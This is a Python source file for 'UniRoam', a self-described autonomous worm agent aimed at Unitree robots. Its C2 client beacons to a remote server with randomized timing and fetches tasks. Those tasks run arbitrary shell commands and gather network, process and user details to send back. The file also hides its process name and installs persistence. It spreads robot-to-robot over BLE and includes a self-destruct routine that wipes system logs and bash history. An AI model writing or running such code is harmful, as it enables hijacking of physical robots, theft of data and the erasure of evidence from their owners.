#!/usr/bin/env python3
"""
Unitree Worm Agent
Main worm logic for robot-to-robot propagation with C2 control
"""

import asyncio
import aiohttp
import json
import random
import sys
import os
import platform
import socket
from datetime import datetime, timedelta
from typing import Optional, Dict
from pathlib import Path
import argparse

from uniroam import config
from uniroam.persistence import establish_persistence, ProcessObfuscation, LogCleaner
from uniroam.propagation_engine import WormPropagator
from uniroam.payload_builder import PayloadManager

# ============================================================================
# C2 Communication
# ============================================================================

class C2Client:
    """Handle communication with C2 server"""
    
    def __init__(self, c2_url: str, robot_id: str):
        """
        Initialize C2 client
        
        Args:
            c2_url: C2 server URL
            robot_id: Unique robot identifier
        """
        self.c2_url = c2_url
        self.robot_id = robot_id
        self.api_key = config.C2_API_KEY
        self.session: Optional[aiohttp.ClientSession] = None
        self.last_beacon = None
        self.tasks_queue = []
    
    async def init_session(self):
        """Initialize HTTP session"""
        if self.session is None:
            timeout = aiohttp.ClientTimeout(total=config.BEACON_TIMEOUT)
            self.session = aiohttp.ClientSession(
                timeout=timeout,
                headers={'X-API-Key': self.api_key}
            )
    
    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
            self.session = None
    
    def get_beacon_interval(self) -> int:
        """Get randomized beacon interval for OpSec"""
        return random.randint(config.BEACON_INTERVAL_MIN, config.BEACON_INTERVAL_MAX)
    
    async def beacon(self, data: Dict = None) -> Optional[Dict]:
        """
        Send beacon to C2
        
        Args:
            data: Additional beacon data
        
        Returns:
            C2 response or None
        """
        await self.init_session()
        
        beacon_data = {
            'robot_id': self.robot_id,
            'timestamp': datetime.now().isoformat(),
            'status': 'active',
            'platform': platform.system(),
            'hostname': socket.gethostname(),
        }
        
        if data:
            beacon_data.update(data)
        
        try:
            url = f"{self.c2_url}{config.C2_BEACON_ENDPOINT}"
            async with self.session.post(url, json=beacon_data) as resp:
                if resp.status == 200:
                    self.last_beacon = datetime.now()
                    return await resp.json()
                return None
        
        except Exception as e:
            # Beacon failed, continue silently
            return None
    
    async def get_tasks(self) -> list:
        """
        Retrieve pending tasks from C2
        
        Returns:
            List of task dictionaries
        """
        await self.init_session()
        
        try:
            url = f"{self.c2_url}{config.C2_TASK_ENDPOINT}/{self.robot_id}"
            async with self.session.get(url) as resp:
                if resp.status == 200:
                    return await resp.json()
                return []
        
        except Exception:
            return []
    
    async def report_result(self, task_id: str, result: Dict):
        """
        Report task execution result to C2
        
        Args:
            task_id: Task identifier
            result: Task result data
        """
        await self.init_session()
        
        report_data = {
            'robot_id': self.robot_id,
            'task_id': task_id,
            'timestamp': datetime.now().isoformat(),
            'result': result
        }
        
        try:
            url = f"{self.c2_url}{config.C2_REPORT_ENDPOINT}"
            async with self.session.post(url, json=report_data) as resp:
                return resp.status == 200
        
        except Exception:
            return False
    
    async def report_event(self, event_type: str, event_data: Dict):
        """
        Report event to C2
        
        Args:
            event_type: Type of event
            event_data: Event details
        """
        await self.beacon({
            'event_type': event_type,
            'event_data': event_data
        })

# ============================================================================
# Task Executor
# ============================================================================

class TaskExecutor:
    """Execute tasks received from C2"""
    
    def __init__(self, propagator: WormPropagator, c2_client: C2Client):
        """
        Initialize task executor
        
        Args:
            propagator: Worm propagator instance
            c2_client: C2 client instance
        """
        self.propagator = propagator
        self.c2_client = c2_client
    
    async def execute_task(self, task: Dict) -> Dict:
        """
        Execute a single task
        
        Args:
            task: Task dictionary
        
        Returns:
            Execution result
        """
        task_type = task.get('type')
        task_id = task.get('id')
        params = task.get('params', {})
        
        result = {
            'success': False,
            'output': '',
            'error': None
        }
        
        try:
            if task_type == 'PROPAGATE_START':
                self.propagator.propagation_enabled = True
                result['success'] = True
                result['output'] = 'Propagation started'
            
            elif task_type == 'PROPAGATE_STOP':
                self.propagator.stop_propagation()
                result['success'] = True
                result['output'] = 'Propagation stopped'
            
            elif task_type == 'EXECUTE_CMD':
                cmd = params.get('command')
                if cmd:
                    import subprocess
                    proc = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    result['success'] = proc.returncode == 0
                    result['output'] = proc.stdout
                    result['error'] = proc.stderr
            
            elif task_type == 'COLLECT_INTEL':
                intel = await self.collect_intel()
                result['success'] = True
                result['output'] = json.dumps(intel)
            
            elif task_type == 'SELF_DESTRUCT':
                await self.self_destruct()
                result['success'] = True
                result['output'] = 'Self-destruct initiated'
            
            elif task_type == 'UPDATE_PAYLOAD':
                # Download and apply update
                result['success'] = False
                result['output'] = 'Update not implemented'
            
            else:
                result['error'] = f'Unknown task type: {task_type}'
        
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    async def collect_intel(self) -> Dict:
        """
        Collect intelligence about the robot
        
        Returns:
            Intelligence data
        """
        import subprocess
        
        intel = {
            'hostname': socket.gethostname(),
            'platform': platform.platform(),
            'network_info': {},
            'processes': [],
            'users': []
        }
        
        try:
            # Network info
            ip_result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
            intel['network_info']['ip_addr'] = ip_result.stdout
            
            route_result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
            intel['network_info']['routes'] = route_result.stdout
        except:
            pass
        
        try:
            # Running processes
            ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
            intel['processes'] = ps_result.stdout.split('\n')[:20]  # First 20 processes
        except:
            pass
        
        try:
            # Users
            who_result = subprocess.run(['who'], capture_output=True, text=True, timeout=5)
            intel['users'] = who_result.stdout.split('\n')
        except:
            pass
        
        return intel
    
    async def self_destruct(self):
        """Execute self-destruct sequence"""
        # Stop propagation
        self.propagator.stop_propagation()
        
        # Clean logs
        if config.CLEANUP_CLEAR_LOGS:
            LogCleaner.clean_system_logs()
            LogCleaner.clear_bash_history()
        
        # Remove persistence
        if config.CLEANUP_REMOVE_PERSISTENCE:
            from persistence import cleanup_persistence
            cleanup_persistence()
        
        # Remove worm files
        if config.CLEANUP_REMOVE_FILES:
            try:
                if Path(config.WORM_INSTALL_PATH).exists():
                    os.remove(config.WORM_INSTALL_PATH)
            except:
                pass
        
        # Exit
        sys.exit(0)

# ============================================================================
# Worm Agent Main
# ============================================================================

class WormAgent:
    """Main worm agent controller"""
    
    def __init__(self, c2_url: str = None):
        """
        Initialize worm agent
        
        Args:
            c2_url: C2 server URL (uses config default if None)
        """
        if c2_url is None:
            c2_url = config.get_c2_url()
        
        self.c2_url = c2_url
        self.robot_id = self.get_robot_id()
        self.c2_client = C2Client(c2_url, self.robot_id)
        self.propagator = None
        self.executor = None
        self.running = False
    
    def get_robot_id(self) -> str:
        """
        Get or generate unique robot ID
        
        Returns:
            Robot identifier
        """
        # Try to get serial number from robot
        try:
            with open('/proc/sys/kernel/hostname', 'r') as f:
                hostname = f.read().strip()
                if any(prefix in hostname for prefix in config.SUPPORTED_MODELS):
                    return hostname
        except:
            pass
        
        # Fallback to hostname
        return socket.gethostname()
    
    async def c2_callback(self, event_data: Dict):
        """
        Callback for propagator to report events
        
        Args:
            event_data: Event information
        """
        event_type = event_data.pop('event', 'unknown')
        await self.c2_client.report_event(event_type, event_data)
    
    async def beacon_loop(self):
        """Main beacon loop"""
        while self.running:
            try:
                # Send beacon
                response = await self.c2_client.beacon({
                    'propagation_stats': self.propagator.get_statistics() if self.propagator else {}
                })
                
                # Check for tasks
                tasks = await self.c2_client.get_tasks()
                
                for task in tasks:
                    result = await self.executor.execute_task(task)
                    await self.c2_client.report_result(task['id'], result)
                
                # Wait before next beacon (with jitter)
                await asyncio.sleep(self.c2_client.get_beacon_interval())
            
            except Exception as e:
                # Continue on error
                await asyncio.sleep(60)
    
    async def propagation_loop(self):
        """Main propagation loop"""
        # Build payload for spreading
        payload_manager = PayloadManager(self.c2_url)
        injection_cmd = payload_manager.generate_injection_command(self.robot_id)
        
        # Start propagation
        await self.propagator.propagate_ble(injection_cmd)
    
    async def run(self):
        """Run the worm agent"""
        self.running = True
        
        # Initialize propagator
        self.propagator = WormPropagator(c2_callback=self.c2_callback)
        self.executor = TaskExecutor(self.propagator, self.c2_client)
        
        # Report initial infection
        await self.c2_client.report_event('agent_started', {
            'robot_id': self.robot_id,
            'platform': platform.platform()
        })
        
        # Start beacon and propagation loops
        try:
            await asyncio.gather(
                self.beacon_loop(),
                self.propagation_loop()
            )
        except KeyboardInterrupt:
            self.running = False
        finally:
            await self.c2_client.close_session()
    
    def install(self):
        """Install persistence mechanisms"""
        # Set obfuscated process name
        ProcessObfuscation.set_process_name()
        
        # Establish persistence
        results = establish_persistence()
        
        print(f"[+] Persistence installed:")
        for mechanism, success in results.items():
            status = "✓" if success else "✗"
            print(f"    {status} {mechanism}")
        
        return any(results.values())

# ============================================================================
# Main Entry Point
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='UniRoam Agent - Autonomous Robot Worm',
        epilog='Part of the UniRoam Framework - Use responsibly.'
    )
    parser.add_argument('--c2-url', type=str, help='C2 server URL')
    parser.add_argument('--install', action='store_true', help='Install persistence and exit')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    args = parser.parse_args()
    
    # Override config if debug mode
    if args.debug:
        config.DEBUG_MODE = True
        config.VERBOSE_LOGGING = True
        config.SIMULATE_INFECTIONS = True
    
    # Create agent
    agent = WormAgent(c2_url=args.c2_url)
    
    # Install mode
    if args.install:
        success = agent.install()
        sys.exit(0 if success else 1)
    
    # Normal operation
    # Obfuscate process name
    ProcessObfuscation.set_process_name()
    
    # Run agent
    try:
        asyncio.run(agent.run())
    except KeyboardInterrupt:
        print("\n[!] Agent stopped by operator")
    except Exception as e:
        if config.DEBUG_MODE:
            print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

